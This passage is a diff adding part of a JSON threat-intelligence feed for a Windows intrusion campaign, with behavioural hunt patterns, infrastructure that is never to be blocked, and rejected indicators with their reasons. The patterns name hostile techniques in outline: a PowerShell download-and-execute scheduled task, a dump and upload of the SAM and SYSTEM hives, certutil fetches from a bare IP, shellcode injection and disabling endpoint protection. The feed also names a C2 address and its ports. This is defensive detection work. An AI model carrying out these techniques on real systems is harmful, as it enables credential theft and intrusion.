+      "pattern": "TLS client hello to a bare IPv4 address with no SNI extension",
+      "confidence": "MODERATE",
+      "action": "HUNT",
+      "false_positive_risk": true,
+      "false_positive_note": "Weak on its own. Useful only combined with the destination or the fixed periodicity",
+      "context": "Direct-IP mTLS beacon behaviour",
+      "type": "behavioral",
+      "value": "TLS client hello to a bare IPv4 address with no SNI extension"
+    },
+    {
+      "pattern": "eth_call JSON-RPC POST from a process that is not a browser or a developer tool",
+      "confidence": "HIGH",
+      "action": "HUNT",
+      "context": "On an endpoint with no web3 tooling this is close to zero-noise. Pair with the known public RPC hostnames as context only",
+      "type": "behavioral",
+      "value": "eth_call JSON-RPC POST from a process that is not a browser or a developer tool"
+    },
+    {
+      "pattern": "Scheduled task whose action is iex((New-Object Net.WebClient).DownloadString(...)), run as SYSTEM with a forged author",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "Fileless weekly re-pull persistence",
+      "type": "behavioral",
+      "value": "Scheduled task whose action is iex((New-Object Net.WebClient).DownloadString(...)), run as SYSTEM with a forged author"
+    },
+    {
+      "pattern": "Run key data beginning conhost --headless and invoking node.exe from a user-writable path with a .bak argument",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "Node.js bot persistence",
+      "type": "behavioral",
+      "value": "Run key data beginning conhost --headless and invoking node.exe from a user-writable path with a .bak argument"
+    },
+    {
+      "pattern": "curl.exe fetching nodejs.org/dist/*.zip followed by tar.exe extraction into %LOCALAPPDATA%",
+      "confidence": "HIGH",
+      "action": "HUNT",
+      "context": "Bring-your-own-runtime bootstrap. Everything after this executes as JavaScript inside a signed node.exe, outside PowerShell script-block logging, AMSI and Constrained Language Mode",
+      "type": "behavioral",
+      "value": "curl.exe fetching nodejs.org/dist/*.zip followed by tar.exe extraction into %LOCALAPPDATA%"
+    },
+    {
+      "pattern": "reg save of HKLM\\SAM, HKLM\\SYSTEM and HKLM\\SECURITY to C:\\ProgramData\\*.bak followed by HTTP PUT to /upload_<name>",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "Complete offline-crackable credential pipeline",
+      "type": "behavioral",
+      "value": "reg save of HKLM\\SAM, HKLM\\SYSTEM and HKLM\\SECURITY to C:\\ProgramData\\*.bak followed by HTTP PUT to /upload_<name>"
+    },
+    {
+      "pattern": "Eight endpoint-protection services stopped and set to disabled in a single burst, then their state reported outbound",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "The capstone script disables the product by service name and confirms the result to the operator",
+      "type": "behavioral",
+      "value": "Eight endpoint-protection services stopped and set to disabled in a single burst, then their state reported outbound"
+    },
+    {
+      "pattern": "certutil -urlcache -split -f against a bare IP on a high port, writing into an admin share",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "Lateral tool transfer in the deployment scripts",
+      "type": "behavioral",
+      "value": "certutil -urlcache -split -f against a bare IP on a high port, writing into an admin share"
+    },
+    {
+      "pattern": "Scheduled task deleted and recreated under the same name on a remote host, then immediately run",
+      "confidence": "HIGH",
+      "action": "HUNT",
+      "context": "Every deployment script follows this delete, create, run sequence",
+      "type": "behavioral",
+      "value": "Scheduled task deleted and recreated under the same name on a remote host, then immediately run"
+    },
+    {
+      "pattern": "VirtualAlloc RW, then VirtualProtect to RX, then CreateThread inside powershell.exe",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "Write-then-execute shellcode injection rather than a direct RWX allocation. All three injector scripts use it",
+      "type": "behavioral",
+      "value": "VirtualAlloc RW, then VirtualProtect to RX, then CreateThread inside powershell.exe"
+    },
+    {
+      "pattern": "PowerShell downloader setting GlobalProxySelection.GetEmptyWebProxy() before fetching",
+      "confidence": "HIGH",
+      "action": "HUNT",
+      "context": "Explicit corporate proxy bypass in the beacon delivery script",
+      "type": "behavioral",
+      "value": "PowerShell downloader setting GlobalProxySelection.GetEmptyWebProxy() before fetching"
+    },
+    {
+      "pattern": "Reflective load of a base64 blob via [System.Reflection.Assembly]::Load()",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "Fileless GodPotato delivery, never touching disk",
+      "type": "behavioral",
+      "value": "Reflective load of a base64 blob via [System.Reflection.Assembly]::Load()"
+    },
+    {
+      "pattern": "Add-DnsServerResourceRecordA planting a record into an AD-integrated zone, pointing at an internal filtering appliance",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "Half of the DNS-filter bypass. The record makes the whitelisted name resolve internally; the appliance whitelist entry makes the filter permit it",
+      "type": "behavioral",
+      "value": "Add-DnsServerResourceRecordA planting a record into an AD-integrated zone, pointing at an internal filtering appliance"
+    }
+  ],
+  "hunt_only_never_block": {
+    "note": "These are genuinely used by the malware, which is why they are recorded, but blocking any of them harms bystanders rather than the operator. Never place them in a blocklist.",
+    "urls": [
+      {
+        "value": "https://nodejs.org/dist/v18.17.0/node-v18.17.0-win-x64.zip",
+        "role": "LEGITIMATE VENDOR DOWNLOAD",
+        "false_positive_note": "Do not block. This is the genuine signed Node.js runtime. The detectable behaviour is node.exe running from %LOCALAPPDATA% under a conhost --headless Run key, not the download"
+      }
+    ],
+    "domains": [
+      {
+        "value": "nodejs.org",
+        "role": "LEGITIMATE VENDOR",
+        "false_positive_note": "Never block"
+      },
+      {
+        "value": "mainnet.gateway.tenderly.co",
+        "role": "PUBLIC ETHEREUM RPC",
+        "false_positive_note": "Never block. Mainstream public infrastructure the bot queries but does not own"
+      },
+      {
+        "value": "rpc.flashbots.net",
+        "role": "PUBLIC ETHEREUM RPC",
+        "false_positive_note": "Never block"
+      },
+      {
+        "value": "rpc.mevblocker.io",
+        "role": "PUBLIC ETHEREUM RPC",
+        "false_positive_note": "Never block"
+      },
+      {
+        "value": "eth-mainnet.public.blastapi.io",
+        "role": "PUBLIC ETHEREUM RPC",
+        "false_positive_note": "Never block"
+      },
+      {
+        "value": "ethereum-rpc.publicnode.com",
+        "role": "PUBLIC ETHEREUM RPC",
+        "false_positive_note": "Never block"
+      },
+      {
+        "value": "eth.drpc.org",
+        "role": "PUBLIC ETHEREUM RPC",
+        "false_positive_note": "Never block"
+      },
+      {
+        "value": "eth.merkle.io",
+        "role": "PUBLIC ETHEREUM RPC",
+        "false_positive_note": "Never block"
+      }
+    ],
+    "ipv4": [
+      {
+        "value": "147.135.84.14",
+        "role": "SHARED HOSTING",
+        "false_positive_note": "Never block. Measured as bulk abused shared hosting carrying 1,747 hostnames since 2019. It hosted the current C2 domain from 2026-09-05, but blocking it takes out unrelated tenants"
+      },
+      {
+        "value": "77.110.126.46",
+        "role": "OPERATOR FALLBACK C2, UNDERLYING HOST OWNERSHIP NOT ESTABLISHED",
+        "protocol": "TCP",
+        "asn": "AS203273 NetCrafters OU",
+        "netblock": "77.110.124.0/22",
+        "beacon_ports": [
+          51264,
+          51265,
+          51266
+        ],
+        "operator_use_confidence": "HIGH",
+        "ownership_confidence": "NOT ESTABLISHED",
+        "action": "HUNT ONLY, NEVER BLOCK",
+        "false_positive_note": "Do not block, but note the reason has changed since this entry was first written. Operator use is not in doubt: the address is hardcoded as the third tier of a multi-C2 fallback list in four enumerated binaries (ws35.exe, ws36.exe, ws37.exe, ws_3srv.exe) on ports 51264 to 51266, it sits on the same AS203273 as the primary C2, and it carries a self-signed certificate whose subject and issuer are both the bare address. CORRECTED: an earlier version of this note justified hunt-only on the reading that the address hosted a third-party organisation's self-hosted Git service and that blocking it would penalise that organisation. That justification does not survive the domain's own history. git.zionministry.org, which resolved here from 2025-12-01 to 2026-06-17, is itself sinkholed and seized infrastructure: Cisco Umbrella blocked it in November 2025, its parent zone was moved to Stichting Registrar of Last Resort on 2026-06-19 under registry-level serverDeleteProhibited and serverUpdateProhibited locks that indicate enforcement custody rather than a voluntary transfer, and it now resolves into a Leaseweb sinkhole block. It was not a legitimate third-party service. THE DISPOSITION STILL STANDS, on narrower grounds. Ownership of the underlying host remains NOT ESTABLISHED: the address carries an Ubuntu OpenSSH banner first seen 2025-05-23 and last seen currently, which is a longer-lived identity than this campaign, and the observed data gives first-seen and last-seen spans rather than sampling density, so continuity cannot be claimed either way. Hunt-only is therefore justified by unestablished ownership, not by an assumed bystander. Hunt for the behaviour instead: raw TCP to ports 51264 to 51266 following failed connections to the primary and secondary tiers.",
+        "record_discrepancy": "The stub decompilation table enumerates four binaries carrying this fallback; the case prose states six in two places. Four is what is currently enumerable. Unresolved, and owned by the infrastructure lane.",
+        "observed_state": "Hardcoded as third-tier fallback in four binaries. Self-signed certificate with subject and issuer both the bare address, valid to 2029-04-06. All probed ports closed as of 2026-09-05",
+        "former_resident_domain": "git.zionministry.org, resident 2025-12-01 to 2026-06-17, since established as sinkholed and seized infrastructure rather than a legitimate third-party service. Do not cite it as evidence that this address belongs to a victim."
+      }
+    ]
+  },
+  "excluded_indicators": {
+    "note": "NOT INDICATORS. Every value below was considered and REJECTED on a stated test. Nothing here may be blocked, alerted on, or ingested as campaign infrastructure. Several are third-party assets that a blocklist would harm. This container exists so the exclusion reasoning is auditable, not so the values can be consumed.",
+    "entries": [
+      {
+        "value": "2196848d251b217de8b2c037e356c11d",
+        "type": "ja3",
+        "reason": "MEASURED at 3,645 distinct hosts with a working control, and nothing in that corpus associates it with Sliver. Commodity Go TLS. Grade INSUFFICIENT. Do not author a detection rule on it"
+      },
+      {
+        "value": "t13i131000_f57a46bbacb6_e5728521abd4",
+        "type": "ja4",
+        "reason": "NOT CHECKED. No available service indexes a connecting client's JA4, so no base rate exists. Not offered as a JA3 substitute"
+      },
+      {
+        "value": "033729fe4f6aadc1ba38de00013f7b0e5e1bf5d540df00872931053488ed79bd",
+        "type": "sha256",
+        "reason": "destoryed.exe. Not in the served directory, first seen eleven days after capture, and its 106 contacted domains include google.com, github.com and dropbox.com. The whole adjacent-ecosystem reading built on it is retracted"
+      },
+      {
+        "value": "dcdivas.com",
+        "type": "domain",
+        "reason": "One of 106 contacted domains on a single unrelated file. NOT CHECKED as a link, never LOW"
+      },
+      {
+        "value": "gorus.space",
+        "type": "domain",
+        "reason": "Arrived on the secondary operator address in a later hosting window than the operator's April use. Shared registrar is thin evidence given that registrar's size. NOT CHECKED"
+      },
+      {
+        "value": "n8n-nether.nafer.ru",
+        "type": "domain",
+        "reason": "Dropped. A later tenant on a recycled address, not implicated in this campaign"
+      },
+      {
+        "value": "a84f6fe166a238c48c5ccebe5312bb63311476fbf14cd81883f3329c36b1362d",
+        "type": "sha256",
+        "reason": "An unheld family member surfaced only by relationship data on the secondary address, with no second line of evidence. Recorded as a lead, kept out of the feed"
+      },
+      {
+        "value": "0019dfc4b32d63c1392aa264aed2253c1e0c2fb09216f8e2cc269bbfb8bb49b5",
+        "type": "sha256",
+        "reason": "A 9-byte package-index cache file, 0 of 61 engines malicious, submitted 3,346 times from 1,540 sources since 2009. Relationship noise, not a campaign artifact"
+      },
+      {
+        "value": "http://localhost:3000",
+        "type": "url",
+        "reason": "A development leftover in the bot's fallback configuration, not reachable infrastructure"
+      },
+      {
+        "value": "victim-side data",
+        "type": "multiple",
+        "reason": "The victim organisation's domain, its hostnames, the operator-created account names, all four recovered passwords, the internal subnets and host octets and the internal asset-tag convention are held in the investigation evidence record and are excluded from every published surface"
+      },
+      {
+        "value": "analysis-environment addresses",
+        "type": "ipv4",
+        "reason": "Addresses appearing in the behavioural telemetry that belong to the analysis environment rather than to either party. One of them collides numerically with the affected organisation's internal range, which makes publishing it actively misleading"
+      },
+      {
+        "value": "two vendor-reported addresses on the same ASN as the primary host",
+        "type": "ipv4",
+        "reason": "Both were queried live on 2026-09-06 and share only an ASN with the primary host: no shared certificate fingerprint, no shared JARM, no shared SSH host key, no overlapping certificate subject. A shared ASN is hosting context and never links on its own. The literal addresses are held in the analyst note rather than here, so that no consumer parsing this feed can mistake them for campaign infrastructure. The Chisel overlap between one of them and this campaign is commodity tooling and links nothing"
+      }
+    ]
+  }
+}
